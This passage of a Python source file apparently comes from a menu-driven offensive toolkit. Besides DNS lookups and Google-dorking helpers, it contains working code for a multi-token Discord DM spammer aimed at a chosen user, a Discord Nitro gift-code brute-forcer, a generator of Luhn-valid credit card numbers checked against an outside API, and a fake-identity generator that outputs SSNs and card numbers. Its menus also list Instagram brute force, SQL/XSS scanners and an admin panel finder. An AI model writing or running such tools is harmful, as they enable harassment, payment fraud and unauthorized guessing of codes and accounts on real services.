                try:
                    nameserver = dns.resolver.resolve(domain, 'NS')
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - Name Server: {[ns.to_text() for ns in nameserver]}")
                except dns.resolver.NoAnswer:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için NS kaydı bulunamadı.")
                
                # CNAME sorgusu
                try:
                    cname = dns.resolver.resolve(domain, 'CNAME')
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - CNAME: {cname[0].to_text()}")
                except dns.resolver.NoAnswer:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için CNAME kaydı bulunamadı.")
                
                # SOA sorgusu
                try:
                    soa = dns.resolver.resolve(domain, 'SOA')
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{domain} - SOA: {soa[0].to_text()}")
                except dns.resolver.NoAnswer:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{domain} için SOA kaydı bulunamadı.")

            except Exception as e:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[!] Error: {e}")
            
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
            return main()
        
        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()

    
    def ip_query():
        try:
            sil()
            print(banner)
            targetip = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[?] Please enter target IP address: ").strip().lower()
            
            try:
                # PTR (Reverse DNS) sorgusu
                dns_ptr = dns.resolver.resolve(targetip, 'PTR')
                print(Style.BRIGHT + Fore.LIGHTCYAN_EX + f"{targetip} - PTR: {dns_ptr[0].to_text()}")
            
            except dns.resolver.NoAnswer:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"{targetip} için PTR kaydı bulunamadı.")
            
            except Exception as e:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[X] Error: {e}")
            
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
            return main()
        
        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()
    
    sil()
    print(banner)
    dns_query_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
    [1] - DNS Query
    [2] - IP Address Query
    [3] - Main menu

    """
    print(dns_query_menu)
    secim = input(Style.BRIGHT + Fore.LIGHTGREEN_EX + "Please enter your choice: ").strip().lower()

    if secim == "1":
        sil()
        dns_query()
    
    elif secim == "2":
        sil()
        ip_query()

    elif secim == "3" or secim.startswith("m"):
        sil()
        return main()

    else:
        sil()
        dns_query_main()

def discord_dm_spammer():
    try:
        sil()
        print(banner)
        print(Style.BRIGHT + Back.LIGHTRED_EX + Fore.LIGHTWHITE_EX + "\nWARNING: You must have set the intents settings of your bots!\n")
        path_of_tokens = input(Style.DIM + Fore.LIGHTBLUE_EX + "[?] Please enter path of the tokens: ").strip()

        try:
            with open(path_of_tokens, "r") as dosya:
                tokens = [line.strip() for line in dosya.readlines()]
        except FileNotFoundError:
            print(Style.BRIGHT + Fore.LIGHTRED_EX + f"Error: file {path_of_tokens} not found!")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
            return main()

        try:
            user_id = int(input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter target user ID: "))
            message_content = input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter the message to be sent: ").strip()
            num_messages = int(input(Style.DIM + Fore.LIGHTYELLOW_EX + "[?] Please enter the number of times the message will be sent: "))
        except Exception as e:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + f"Error: {e}")
            input(Fore.LIGHTMAGENTA_EX + "\nPress 'Enter' to continue...\n")
            return main()

        intents = discord.Intents.default()
        intents.messages = True

        async def run_bot(token):
            bot = commands.Bot(command_prefix="!", intents=intents)

            @bot.event
            async def on_ready():
                print(Fore.GREEN + f"Logged in with {bot.user.name}, sending DM to the user.\n")
                try:
                    user = await bot.fetch_user(user_id)
                    for i in range(num_messages):
                        await user.send(message_content)
                        print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"\n[✓] Message sent to {user.name} ({i + 1}/{num_messages}).")

                except discord.DiscordException as e:
                    print(Style.BRIGHT + Fore.LIGHTRED_EX + f"[X] An error occurred: {str(e)}")
                finally:
                    await bot.close()

            await bot.start(token)

        async def run_all_bots():
            tasks = [run_bot(token) for token in tokens]
            await asyncio.gather(*tasks)

        loop = asyncio.get_event_loop()
        loop.run_until_complete(run_all_bots())

    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()


def google_dorking():

    # DOSYA ARAMA FONKSİYONU
    def google_dorking_search_files():
        try:
            sil()
            print(banner)
            aranacak_site = input(Style.DIM + Fore.LIGHTMAGENTA_EX + "[?] If you want to search on a site, enter the site domain (instagram.com): ").strip().lower() or None
            aranacak_dosya_uzantisi = input(Style.DIM + Fore.LIGHTMAGENTA_EX + "[?] Please enter your file extension (pdf): ").strip().lower()
            aranacak_mesaj = input(Style.DIM + Fore.LIGHTMAGENTA_EX + "[?] Please enter the message to be searched in the file: ").strip().lower() or None

            if aranacak_site:
                if aranacak_site.startswith("https://"):
                    aranacak_site = aranacak_site.replace("https://", "")

                elif aranacak_site.startswith("http://"):
                    aranacak_site = aranacak_site.replace("http://", "")

                elif aranacak_site.startswith("www."):
                    aranacak_site = aranacak_site.replace("www.", "")
                
                if not aranacak_site.endswith(".com"):
                    aranacak_site += ".com"
                
            query_parts = []
            if aranacak_site:
                query_parts.append(f"site:{aranacak_site}")
            query_parts.append(f"filetype:{aranacak_dosya_uzantisi}")
            if aranacak_mesaj:
                query_parts.append(f"\"{aranacak_mesaj}\"")

            query = " ".join(query_parts)
            url = f"https://www.google.com/search?q={query}"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            
            response = requests.get(url, headers=headers)
            try:
                response = requests.get(url, headers=headers)

                if response.status_code == 200:
                    webbrowser.open(url)
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()

                else:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Error: Status code: {response.status_code}")
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()

            except ConnectionError:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Error: Connection error!")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()

            except Exception as e:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Error: {e}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()
            
        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()
            
    def google_dorking_search_intext():
        try:
            sil()
            print(banner)
            
            aranacak_site = input(Style.DIM + Fore.LIGHTMAGENTA_EX + "[?] If you want to search on a site, enter the site domain (instagram.com): ").strip().lower()
            aranacak_mesaj = input(Style.DIM + Fore.LIGHTMAGENTA_EX + "[?] Please enter the message to be searched in the file: ").strip().lower()

            if aranacak_site:
                if aranacak_site.startswith("https://"):
                    aranacak_site = aranacak_site.replace("https://", "")
                elif aranacak_site.startswith("http://"):
                    aranacak_site = aranacak_site.replace("http://", "")
                elif aranacak_site.startswith("www."):
                    aranacak_site = aranacak_site.replace("www.", "")
                
                if not aranacak_site.endswith(".com"):
                    aranacak_site += ".com"

            query_parts = []
            if aranacak_site:
                query_parts.append(f"site:{aranacak_site}")
            if aranacak_mesaj:
                query_parts.append(f"\"{aranacak_mesaj}\"")

            query = " ".join(query_parts)

            querysecond = []
            if aranacak_mesaj:
                querysecond.append(f"allintitle:\"{aranacak_mesaj}\"")
            if aranacak_site:
                querysecond.append(f"site:{aranacak_site}")

            querysecond = " ".join(querysecond)

            url = f"https://www.google.com/search?q={query}"
            urlsecond = f"https://www.google.com/search?q={querysecond}"
            
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }

            try:
                response = requests.get(url, headers=headers)

                if response.status_code == 200:
                    webbrowser.open(url)
                    webbrowser.open(urlsecond)
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()
                else:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] Error: Status code: {response.status_code}")
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()

            except Exception as e:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + f"[X] An error occurred: {str(e)}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()
            
        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()

    sil()
    print(banner)
    google_dorking_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
    [1] - Search Files
    [2] - Search intext
    [3] - Main menu

    """
    print(google_dorking_menu)
    secim = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "Please enter your choice: ").strip().lower()

    if secim == "1" or secim.startswith("f"):
        sil()
        google_dorking_search_files()

    elif secim == "2" or secim.startswith("u"):
        sil()
        google_dorking_search_intext()

    elif secim == "3" or secim.startswith("m"):
        sil()
        return main()
    
    else:
        sil()
        google_dorking()

async def generate_code():
    try:
        kodbaslangici = "https://discord.com/billing/promotions/"
        kodkarakterleri = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
        kod = ""
        sayi = 0
        for i in range(24):
            eklenecekharf = random.choice(kodkarakterleri)
            kod += eklenecekharf
            sayi += 1
            if sayi == 4 and i != 23:
                kod += "-"
                sayi = 0
        full_code = f"{kodbaslangici}{kod}"
        return kod
    
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

async def check_code(session, kod):
    try:
        url = f"https://discord.com/api/v10/entitlements/gift-codes/{kod}?with_application=false&with_subscription_plan=true"
        async with session.get(url) as response:
            if response.status == 200:
                print(Style.BRIGHT + Back.LIGHTGREEN_EX + Fore.LIGHTGREEN_EX + f"[+] Valid Code: {kod}")
                with open("validcode.txt", "a", encoding="utf8") as dosya:
                    dosya.write(f"[+] Valid Code: {kod}\n")
                print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"\nSaved as 'validcode.txt'\n")
                webbrowser.open(f"https://www.discord.com/billing/promotions/{kod}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()
            else:
                print(Style.DIM + Fore.RED + f"[-] Invalid Code: {kod}")
                return False
            
    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

async def discord_nitro_generator_and_checker():
    try:
        sil()
        print(banner)
        async with aiohttp.ClientSession() as session:
            while True:
                kod = await generate_code()
                if await check_code(session, kod):
                    break

    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

def random_credit_card_generator():
    sil()
    print(banner)

    def generate_card_number(prefix=4000, length=16):
        card_number = [int(d) for d in str(prefix)]

        while len(card_number) < length - 1:
            card_number.append(random.randint(0, 9))

        checksum = 0
        for i in range(len(card_number)):
            n = card_number[i]
            if (length - 1 - i) % 2 == 0:
                n *= 2
                if n > 9:
                    n -= 9
            checksum += n

        last_digit = (10 - (checksum % 10)) % 10
        card_number.append(last_digit)

        return ''.join(map(str, card_number))

    apikey = None
    apikeyvarmi = input(Style.BRIGHT + Fore.WHITE + "[!] Do you have an API key from 'apiverve.com' (y/n): ").lower().strip() or ""

    if apikeyvarmi.startswith("y"):
        apikey = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[?] Please enter your API Key: ").strip()
        print("\n")

    elif apikeyvarmi.startswith("n"):
        webbrowser.open("https://apiverve.com/signup")
        return main()
    
    else:
        return main()

    while True:
        try:
            card_number = generate_card_number()

            url = f"https://api.apistacks.com/v1/validatecard?api_key={apikey}&cardnumber={card_number}"

            try:
                response = requests.get(url)
                if response.status_code == 200:
                    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + f"[+] Valid Card: {card_number}")
                    with open("creditcards.txt", "a", encoding="utf-8") as dosya:
                        dosya.write(f"[+] {card_number}\n")
                    input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                    return main()

                else:
                    print(Style.DIM + Fore.LIGHTRED_EX + f"[-] Invalid Card: {card_number}")

            except Exception as e:
                print(Style.BRIGHT + Fore.LIGHTRED_EX + f"An error occurred: {e}")
                input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")
                return main()

        except KeyboardInterrupt:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
            return main()
        
        except EOFError:
            sil()
            print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
            exit()

def random_id_generator():
    try:
        sil()
        print(banner)
        sayi = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "[?] How many fake identities should be generated: ").strip() or None

        if sayi is None or not sayi.isdigit():
            return main()
        
        sayi = int(sayi)

        for _ in range(sayi):
            random_ulke = random.choice(["tr_TR", "en_US"])
            fake = Faker(random_ulke)

            data_types = [
                "name",
                "address",
                "email",
                "phone_number",
                "job",
                "company",
                "date_of_birth",
                "ssn",
                "credit_card_number",
                "credit_card_expire",
                "country",
                "city",
                "state",
                "zipcode",
                "latitude",
                "longitude",
                "text",
            ]

            kimlik_bilgisi = ""
            for data_type in data_types:
                if data_type == "date_of_birth":
                    value = fake.date_of_birth()
                else:
                    value = getattr(fake, data_type)()

                kimlik_bilgisi += f"{data_type.capitalize()}: {value}\n"
                print(Style.DIM + Fore.LIGHTGREEN_EX + f"{data_type.capitalize()}: {value}")

            kayit_etmek_ister_misin = input(Style.BRIGHT + Fore.LIGHTMAGENTA_EX + "[?] Do you want to save this identity (y/n): ").strip().lower() or "n"

            if kayit_etmek_ister_misin == "y":
                with open("random_id.txt", "a", encoding="utf-8") as dosya:
                    dosya.write("\n---------------------------------\n" + kimlik_bilgisi + "---------------------------------\n")
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[+] Identity saved to 'random_id.txt'")
            else:
                print(Fore.LIGHTRED_EX + "[-] Identity not saved.")

            input(Fore.LIGHTMAGENTA_EX + "\nPress 'enter' to continue...\n")

        return main()

    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()

    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()



# ANA FONKSİYON
def main():
    try:
        def instagram_tools():
            sil()
            print(banner)
            instagramtoolsmenu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
        [1] - Instagram Brute Force
        [2] - Instagram checker
        [3] - Instagram OSINT
        [4] - Main Menu
        """
            print(instagramtoolsmenu)
            secim = input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Please enter your choice: ").strip().lower()

            if secim == "1" or secim.startswith("b"):
                sil()
                instagram_brute_force()

            elif secim == "2" or secim.startswith("c"):
                sil()
                instagram_checker()

            elif secim == "3" or secim.startswith("o"):
                sil()
                instagram_osint()

            elif secim == "4" or secim.startswith("m"):
                sil()
                return main()

            else:
                sil()
                instagram_tools()

        def web_tools():
            sil()
            print(banner)
            webtoolsmenu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
        [1] - SQL Scanner
        [2] - XSS Scanner
        [3] - Directory Scanner
        [4] - Port Scanner
        [5] - Admin Panel Finder
        [6] - DNS Query
        [7] - Main Menu

        """
            print(webtoolsmenu)
            secim = input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Please enter your choice: ").strip().lower()

            if secim == "1" or secim.startswith("s"):
                sil()
                sql_scanner()

            elif secim == "2" or secim.startswith("x"):
                sil()
                xss_scanner()

            elif secim == "3" or secim == "directory":
                sil()
                directory_scanner()

            elif secim == "4" or secim.startswith("p"):
                sil()
                port_scanner()

            elif secim == "5" or secim.startswith("a"):
                sil()
                admin_panel_finder()

            elif secim == "6" or secim == "dns":
                sil()
                dns_query_main()

            elif secim == "7" or secim.startswith("m"):
                sil()
                return main()

            else:
                sil()
                web_tools()

        def discord_tools():
            sil()
            print(banner)
            discord_tools_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
        [1] - Discord DM spammer
        [2] - Discord Nitro generator & checker
        [3] - Main menu
        
        """
            print(discord_tools_menu)
            secim = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "Please enter your choice: ").strip().lower()
            
            if secim == "1" or secim.startswith("d"):
                sil()
                discord_dm_spammer()

            elif secim == "2" or secim.startswith("n"):
                sil()
                asyncio.run(discord_nitro_generator_and_checker())

            elif secim == "3" or secim.startswith("m"):
                sil()
                return main()
            
            else:
                sil()
                discord_tools()


        def other_tools():
            sil()
            print(banner)
            other_tools_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
        [1] File encrypt - decrypt
        [2] Google dorking
        [3] Main menu
        
        """
            print(other_tools_menu)
            secim = input(Style.BRIGHT + Fore.LIGHTYELLOW_EX + "Please enter your choice: ").strip().lower()

            if secim == "1" or secim.startswith("f"):
                sil()
                sifreleme_main()

            elif secim == "2" or secim.startswith("g"):
                sil()
                google_dorking()

            elif secim == "3" or secim.startswith("m"):
                sil()
                return main()
            
            else:
                sil()
                other_tools()

        def random_generate_tools():
            sil()
            print(banner)
            random_generate_tools_menu = Style.BRIGHT + Fore.LIGHTCYAN_EX + """
        [1] Random Credit Card Generator
        [2] Random ID Generator
        [3] Main Menu
        
        """
            print(random_generate_tools_menu)
            secim = input(Style.BRIGHT + Fore.LIGHTCYAN_EX + "Please enter your choice: ").strip().lower()

            if secim == "1" or secim == "cc":
                sil()
                random_credit_card_generator()

            elif secim == "2" or secim == "id":
                sil()
                random_id_generator()

            elif secim == "3" or secim.startswith("m"):
                sil()
                return main()
            
            else:
                sil()
                random_generate_tools()


        sil()
        print(banner)
        main_menu = Style.BRIGHT + Fore.LIGHTBLUE_EX + """

        [1] - Instagram Tools
        [2] - Web Tools
        [3] - Discord Tools
        [4] - Other Tools
        [5] - Random Generate Tools
        [Q] - Exit
        
        """
        print(main_menu)
        secim = input(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Please enter your choice: ").strip().lower()

        if secim == "1" or secim.startswith("i") or secim.startswith("ı"):
            sil()
            instagram_tools()

        elif secim == "2" or secim.startswith("w"):
            sil()
            web_tools()

        elif secim == "3" or secim.startswith("d"):
            sil()
            discord_tools()

        elif secim == "4" or secim.startswith("o"):
            sil()
            other_tools()

        elif secim == "5" or secim.startswith("r"):
            sil()
            random_generate_tools()

        elif secim == "0" or secim.startswith("q") or secim.startswith("e"):
            sil()
            exit()

        else:
            return main()

    except KeyboardInterrupt:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + C detected, returning to main menu...")
        return main()
    
    except EOFError:
        sil()
        print(Style.BRIGHT + Fore.LIGHTBLACK_EX + "[!] CTRL + Z detected, exiting...")
        exit()

main()